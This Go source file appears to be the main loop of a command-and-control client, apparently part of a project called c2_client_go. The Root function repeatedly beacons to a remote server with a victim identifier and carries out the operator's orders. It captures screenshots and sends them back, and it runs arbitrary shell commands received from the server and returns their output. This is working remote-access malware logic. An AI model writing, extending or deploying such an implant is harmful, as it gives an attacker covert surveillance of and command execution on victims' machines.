package cmd

import (
	"c2_client_go/cmdtype"
	"c2_client_go/config"
	"c2_client_go/fuc"
	"fmt"
	"log"
	"time"
)

func Root(uuid string) {
	//fmt.Println("sleep:", config.GetSleepTime())
	for true {
		sleeptime := config.GetSleepTime() //获取初始延时
		msginfo, _ := SendMsg(uuid, "Online.js", "online", "","")
		//fmt.Println(msginfo)
		if msginfo.Uuid == uuid {
			switch msginfo.Msgtype {
			case "add":
				fmt.Println("ok")
			case "screenshot":
				fmt.Println("收到截图请求")
				b, err := cmdtype.Screenshot()
				if err != nil {
					Set("Screenshot.js", "screenshot", "err",msginfo.Msgid)
				}
				Set("Screenshot.js", "screenshot", b,msginfo.Msgid)
			case "cmd":
				fmt.Println("收到命令执行")
				cmdstr := msginfo.Msg
				fmt.Println(cmdstr)
				c := fuc.Cmd(cmdstr)
				Set("RunCmd.js", "cmd", c,msginfo.Msgid)
			default:
				Set("Online.js", "online", "","")
			}
		} else {
			Set("Online.js", "online", "","")
			log.Println("等待命令中.")
		}
		SendMsg(uuid, config.GetCmdType(), config.GetMsgType(), config.GetMsg(),config.Msgid)
		time.Sleep(time.Second * time.Duration(sleeptime))
	}
}

func Set(cmdtype string, msgtype string, msg string,msgid string) { //设置返回值
	config.SetCmdType(cmdtype)
	config.SetMsgType(msgtype)
	config.SetMsg(msg)
	config.SetMsgid(msgid)
}
